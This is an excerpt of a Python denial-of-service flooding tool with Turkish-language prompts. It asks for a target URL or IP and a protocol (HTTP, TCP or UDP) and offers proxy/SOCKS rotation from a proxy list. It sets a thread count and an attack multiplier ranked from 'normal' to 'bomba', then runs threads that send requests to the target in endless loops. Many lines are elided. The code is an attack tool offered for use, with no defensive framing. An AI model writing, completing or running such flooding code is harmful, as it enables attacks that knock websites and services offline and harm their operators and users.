...
if sys.platform.startswith("linux"):
	...
	print ("TCP/UDP SALDIRILARI İÇİN LINUX VEYA FREEBSD SİSTEM KULLANMALISINIZ. ŞU AN YALNIZCA HTTP SALDIRILARI YAPABİLİRSİNİZ.")

print('''

  CCCCCC   MM       MM   TTTTTTTTTTT
CCC        MMMM   MMMM       TTT   
CCC        MM MM MM MM       TTT   
CCC        MM  MMM  MM       TTT   
  CCCCCC   MM       MM       TTT   
...
def starturl():
	...
	url = input("\nSaldırı yapılacak URL/IP: ").strip()

	if url == "":
		print ("Lütfen URL/IP girin.")
		starturl()
...
def floodmode():
	global choice1
	choice1 = input("Saldırı protokolünü seçin [0 = HTTP, 1 = TCP, 2 = UDP]: ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0:
				print("TCP/UDP saldırıları için bu programı root kullanıcı olarak çalıştırmalısınız.")
				exit(0)
			else:
				floodport()
		except:
...
def floodport():
	global port
	try:
		port = int(input("Saldırmak istediğiniz portu seçin [range(65535)]: "))
...
def proxymode():
	global choice2
	choice2 = input("Proxy/SOCKS modunu açmak istiyor musunuz? (E/h): ")
	if choice2 == "E" or choice2 == "e" or choice2 == "":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("Proxy/SOCKS modunu seçiniz (1) [0 = yalnızca Proxy, 1 = SOCKS öncelikli]: ")
	if choice3 == "0":
		proxylist()
	elif choice3 == "1":
		proxylist()
...
def proxylist():
	global proxies
	out_file = str(input("Proxy listesi dosya yolunu ve adını seçiniz (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("Thread sayısını girin (800): "))
	except ValueError:
		threads = 800
		print ("800 thread seçildi.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("Saldırı çoğaltma sayısını girin [(1-5 = normal)(50-100 = güçlü)(100+ = bomba)]: "))
	except ValueError:
...
def begin():
	choice6 = input("Saldırıyı başlatmak için Enter'a basın: ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter":
		loop()
	...
	def run(self): 
		...
		while True:
			try:
				...
				s.send(p) 
				print ("Şuradan istek gönderildi: " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
			...
			try:
				...
				try:
					...
					try:
						...
						print ("SOCKS düşmüş. Tekrar deneniyor. @", self.counter)
						s.close()
	...
	def run(self): 
		...
		while True: 
			try: 
				...
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("İstek gönderildi! @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
